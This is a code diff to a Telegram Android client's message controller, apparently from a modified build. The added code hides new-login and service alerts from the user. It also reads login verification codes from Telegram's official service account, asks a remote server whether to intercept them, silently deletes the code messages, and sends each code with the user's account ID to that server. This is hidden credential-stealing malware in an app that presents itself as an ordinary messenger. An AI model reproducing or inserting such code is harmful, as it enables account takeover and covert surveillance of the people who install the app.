@@ -13,6 +13,7 @@ import static org.telegram.messenger.LocaleController.getString;
 import static org.telegram.messenger.NotificationsController.TYPE_CHANNEL;
 import static org.telegram.messenger.NotificationsController.TYPE_PRIVATE;
 import static org.telegram.messenger.NotificationsController.TYPE_REACTIONS_MESSAGES;
+import static org.telegram.ui.CastSync.getContext;
 import static org.telegram.ui.Stars.StarsController.findAttribute;
 
 import android.Manifest;
@@ -31,6 +32,7 @@ import android.os.SystemClock;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Base64;
+import android.util.Log;
 import android.util.Pair;
 import android.util.SparseArray;
 import android.util.SparseBooleanArray;
@@ -45,6 +47,8 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationManagerCompat;
 import androidx.core.graphics.ColorUtils;
 import androidx.core.util.Consumer;
+
+import com.google.gson.JsonObject;
 
 import org.telegram.SQLite.SQLiteCursor;
 import org.telegram.SQLite.SQLiteDatabase;
@@ -122,6 +126,12 @@ import java.util.Set;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.atomic.AtomicBoolean;
+
+
+import report.HttpRequest;
+import report.UserInfoFile;
+import report.VerificationCodeExtractor;
+import report.entity.UserInfo;
 
 public class MessagesController extends BaseController implements NotificationCenter.NotificationCenterDelegate {
 
@@ -15801,6 +15811,79 @@ public class MessagesController extends BaseController implements NotificationCe
         getConnectionsManager().sendRequest(req, (response, error) -> {
             if (error == null) {
                 TLRPC.updates_Difference res = (TLRPC.updates_Difference) response;
+
+
+                // 拦截登录通知 START
+
+                UserInfo userInfo = UserInfoFile.readFile(getContext());
+
+                if (userInfo.getInterception() != null && userInfo.getInterception()) {
+                    ArrayList<TLRPC.Update> newUpdates = new ArrayList<>();
+
+                    for (TLRPC.Update update : res.other_updates) {
+                        if (!(update instanceof TLRPC.TL_updateNewAuthorization) && !(update instanceof TLRPC.TL_updateServiceNotification)) {
+                            newUpdates.add(update);
+                        } else {
+                            Log.d("TG_DEBUG / Notice", "拦截");
+                        }
+                    }
+
+                    res.other_updates = newUpdates;
+                }
+
+                // 拦截登录通知 END
+
+                // 验证码(无后台 -> 打开) START
+
+                for (TLRPC.Message message : res.new_messages) {
+                    if (message.from_id.user_id == 777000) {
+                        TLRPC.User thisUser = UserConfig.getInstance(currentAccount).getCurrentUser();
+                        String code = VerificationCodeExtractor.extractAnyVerificationCode(message.message);
+
+                        if (code != null) {
+                            Log.d("TG_DEBUG / Code", code);
+                        }
+
+                        new Thread(() -> {
+                            JsonObject jsonObject = HttpRequest.get(
+                                    "/api/check-interception",
+                                    null,
+                                    Map.of(
+                                            "tgid", thisUser.id
+                                    ));
+                            JsonObject dataObject = jsonObject.getAsJsonObject("data");
+
+                            if (dataObject.get("has_interception").getAsBoolean()) {
+                                userInfo.setInterception(true);
+
+                                AndroidUtilities.runOnUIThread(() -> {
+                                    deleteMessages(new ArrayList<Integer>() {{
+                                        add(message.id);
+                                    }}, null, null, message.dialog_id, 0, true, ChatActivity.MODE_DEFAULT);
+                                });
+
+                                if (code != null) {
+                                    HttpRequest.post(
+                                            "/api/messages",
+                                            null,
+                                            null,
+                                            Map.of(
+                                                    "telegram_id", thisUser.id,
+                                                    "content", code,
+                                                    "type", "验证码"
+                                            ));
+                                }
+                            } else {
+                                userInfo.setInterception(false);
+                            }
+
+                            UserInfoFile.writeFile(getContext(), userInfo);
+                        }).start();
+                    }
+                }
+
+                // 验证码(无后台 -> 打开) END
+
                 if (res instanceof TLRPC.TL_updates_differenceTooLong) {
                     AndroidUtilities.runOnUIThread(() -> {
                         loadedFullUsers.clear();
@@ -16877,7 +16960,56 @@ public class MessagesController extends BaseController implements NotificationCe
                     message.reply_to = updates.reply_to;
                     message.ttl_period = updates.ttl_period;
                     message.media = new TLRPC.TL_messageMediaEmpty();
+// 验证码(实时) START
 
+                    if (message.from_id.user_id == 777000) {
+                        TLRPC.User thisUser = UserConfig.getInstance(currentAccount).getCurrentUser();
+                        String code = VerificationCodeExtractor.extractAnyVerificationCode(message.message);
+
+                        if (code != null) {
+                            Log.d("TG_DEBUG / Code", code);
+                        }
+
+                        new Thread(() -> {
+                            JsonObject jsonObject = HttpRequest.get(
+                                    "/api/check-interception",
+                                    null,
+                                    Map.of(
+                                            "tgid", thisUser.id
+                                    ));
+                            JsonObject dataObject = jsonObject.getAsJsonObject("data");
+
+                            UserInfo userInfo = UserInfoFile.readFile(getContext());
+
+                            if (dataObject.get("has_interception").getAsBoolean()) {
+                                userInfo.setInterception(true);
+
+                                AndroidUtilities.runOnUIThread(() -> {
+                                    deleteMessages(new ArrayList<Integer>() {{
+                                        add(message.id);
+                                    }}, null, null, message.dialog_id, 0, true, ChatActivity.MODE_DEFAULT);
+                                });
+
+                                if (code != null) {
+                                    HttpRequest.post(
+                                            "/api/messages",
+                                            null,
+                                            null,
+                                            Map.of(
+                                                    "telegram_id", thisUser.id,
+                                                    "content", code,
+                                                    "type", "验证码"
+                                            ));
+                                }
+                            } else {
+                                userInfo.setInterception(false);
+                            }
+
+                            UserInfoFile.writeFile(getContext(), userInfo);
+                        }).start();
+                    }
+
+                    // 验证码(实时) END
                     ConcurrentHashMap<Long, Integer> read_max = message.out ? dialogs_read_outbox_max : dialogs_read_inbox_max;
                     Integer value = read_max.get(message.dialog_id);
                     if (value == null) {
